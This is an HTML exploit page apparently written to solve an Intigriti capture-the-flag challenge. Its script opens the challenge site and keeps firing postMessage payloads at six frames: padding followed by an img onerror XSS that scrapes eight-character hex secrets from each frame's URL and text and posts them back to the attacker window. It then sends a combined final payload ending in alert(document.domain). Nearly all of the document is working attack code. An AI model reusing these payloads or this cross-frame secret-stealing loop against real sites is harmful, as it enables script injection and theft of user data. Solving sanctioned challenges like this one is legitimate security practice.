<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Speed Run</title>
</head>
<body>
    <h1>Exploit: Speed Run</h1>
    <p>Click the button. Don't switch tabs!</p>
    <button id="btn" style="font-size:20px; padding:20px; background:red; color:white;">LAUNCH EXPLOIT</button>
    <h3>Log:</h3>
    <pre id="log" style="background:#f0f0f0; padding:10px;"></pre>

    <script>
        let stolenStones = {};
        let targetWin = null;
        let attackInterval = null;

        // 1. Listen for the stolen pieces
        window.addEventListener('message', (event) => {
            if (event.data.type === 'stone_collected') {
                // Avoid duplicates log
                if (!stolenStones[event.data.index]) {
                    log(`[+] Captured Stone ${event.data.index}: ${event.data.secret}`);
                    stolenStones[event.data.index] = event.data.secret;
                    checkAndSnap();
                }
            }
        });

        document.getElementById('btn').addEventListener('click', () => {
            // Open the target
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            log("Target opened! attacking immediately...");

            // START THE ATTACK LOOP
            // We fire the exploit every 500ms to ensure we hit the window 
            // between 'page load' and 'bye.jpeg' (0s to 3s).
            attackInterval = setInterval(attackAllStones, 500);
        });

        function attackAllStones() {
            // Stop if window closed or we have all stones (prevent spam)
            if(Object.keys(stolenStones).length >= 6) return;

            log("Firing exploit salvo...");
            
            // Attack all 6 frames
            for (let i = 0; i < 6; i++) {
                if(stolenStones[i]) continue; // Skip if we already have this one
                sendExploit(i);
            }
        }

        function sendExploit(index) {
            if(!targetWin) return;
            // Frames might not be ready yet, try-catch to avoid console errors halting script
            try {
                let targetFrame = targetWin.frames[index];
                if (!targetFrame) return;

                // STEP 1: PRIMER (2000 chars padding)
                const padding = "A".repeat(2000); 
                targetFrame.postMessage(padding + "<", '*');

                // STEP 2: PAYLOAD (Extract from DOM)
                // Since your screenshot showed the code is visible on screen, 
                // we use a robust DOM scraper + URL scraper combo.
                const extractorScript = `
                    var secret = "";
                    // 1. Try URL
                    var match = location.search.match(/=[a-f0-9]{8}/);
                    if(match) secret = match[0].substring(1);
                    
                    // 2. Try Body Text (Reliable for Space Stone & others)
                    if(!secret || secret.length < 8) {
                        var body = document.body.innerText;
                        var hexMatch = body.match(/[a-f0-9]{8}/);
                        if(hexMatch) secret = hexMatch[0];
                    }

                    // 3. Send back
                    if(secret && window.top.opener) {
                        window.top.opener.postMessage({type: 'stone_collected', index: ${index}, secret: secret}, '*');
                    }
                `;

                const payload = `<img src=x onerror="${extractorScript}">`;
                targetFrame.postMessage(payload, '*');
                
            } catch(e) { console.log("Frame not ready yet"); }
        }

        function checkAndSnap() {
            // Do we have all 6?
            if (Object.keys(stolenStones).length >= 6) {
                clearInterval(attackInterval); // Stop the attack loop
                
                // Reassemble: Power(0) + Mind(5) + Reality(1) + Space(3) + Soul(2) + Time(4)
                const fullCode = 
                    stolenStones[0] + 
                    stolenStones[5] + 
                    stolenStones[1] + 
                    stolenStones[3] + 
                    stolenStones[2] + 
                    stolenStones[4];

                log("GAUNTLET COMPLETE: " + fullCode);
                log("Executing SNAP...");

                // FINAL ATTACK
                // We send the message to the MAIN window (targetWin).
                // Even if the iframes are dead (bye.jpeg), the main window listener 
                // is usually still attached to the window object!
                
                // Send directly to the window (no need to use an iframe proxy if we are just talking to the window)
                // The challenge listener is: window.addEventListener('message', ...)
                
                const finalPayload = fullCode + "alert(document.domain)";
                targetWin.postMessage(finalPayload, '*');
                
                log("Final payload sent! Check the target tab.");
            }
        }

        function log(msg) {
            document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
        }
    </script>
</body>
</html>
